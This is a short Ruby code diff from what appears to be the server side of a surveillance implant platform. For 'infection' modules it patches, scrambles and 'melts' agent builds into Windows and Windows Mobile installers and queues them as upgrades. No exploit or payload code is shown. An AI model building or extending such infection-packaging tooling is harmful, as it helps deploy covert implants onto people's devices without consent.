@@ -176,15 +176,28 @@ class Item
       if mod['module'] == 'infection'
 
         if mod['usb'] or mod['vm'] > 0
-          puts
-          puts "VM USB"
-          puts
+          factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+          build = RCS::DB::Build.factory(:windows)
+          build.load({'_id' => factory._id})
+          build.unpack
+          build.patch({'demo' => self.demo})
+          build.scramble
+          build.melt({'admin' => false})
+          add_upgrade('installer', File.join(build.tmpdir, 'output'))
+          build.clean
         end
 
         if mod['mobile']
-          puts
-          puts "MOBILE"
-          puts
+          factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+          build = RCS::DB::Build.factory(:winmo)
+          build.load({'_id' => factory._id})
+          build.unpack
+          build.patch({'demo' => self.demo})
+          build.scramble
+          build.melt({'admin' => false})
+          add_upgrade('wmcore.001', File.join(build.tmpdir, 'firstsage'))
+          add_upgrade('wmcore.002', File.join(build.tmpdir, 'zoo'))
+          build.clean
         end
       end
     end
